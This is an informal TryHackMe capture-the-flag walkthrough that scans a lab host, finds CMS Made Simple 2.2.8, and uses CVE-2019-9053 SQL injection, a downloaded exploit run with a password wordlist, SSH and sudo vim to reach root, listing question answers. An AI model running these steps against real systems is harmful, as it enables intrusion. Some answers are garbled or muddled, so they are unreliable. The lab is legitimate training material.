# Tryhackme
Q1: How many services are running under port 1000?
Sol: nmap -sV -sC ip -p1-1000

Q2: What is running on the higher port?
Sol: nmap ip , its need name of port not number 
Q3: What’s the CVE you’re using against the application?
to find that we need to make gobuster bez when put nmuber of port next to ip nothing appear so 
gobuster dir -u http:ip:number_of_port -w /usr/share/wordlists/dirbuster/directory-list-
2.3-medium.txt -t 100
we get simple.txt 
now put in in link 
http:ip/simple.txt 
to get name of devlop web 
CMS made simple 2.2.8
search in google to get cve 
Sol:CVE-2019–9053
Q4: To what kind of vulnerability is the application vulnerable?
the website for cve its mean sql 
Sol: sqli 
Q5:What’s the password?
we have exploit must start download it in my device 
make that to download it 
python ex.py -u http:ip/simple.txt  --crack -w /usr/share/wordlists/rockyou.txt
fix python codr in print code ()
Sol:secret 

Q6:Where can you login with the details obtained?
try ssh ip its work 
Sol:SSH
ssh username@ip -p 2222
id 
ls 
Q7:What’s the user flag?
dir 
pwd 

cat user.txt
sol:user.txt
Q8:Is there any other user in the home directory? What’s its name?
cd .. 
ls 
sol:
sunbath
Q9: What can you leverage to spawn a privileged shell?
sudo -i
We can see the user “mitch” can run /usr/bin/vim without a password. With that information, let’s check out GTFOBins and see if we can use that for privesc.
Sol:vim
Q10:What’s the root flag?

root.txt
Sol:cd /root.txt
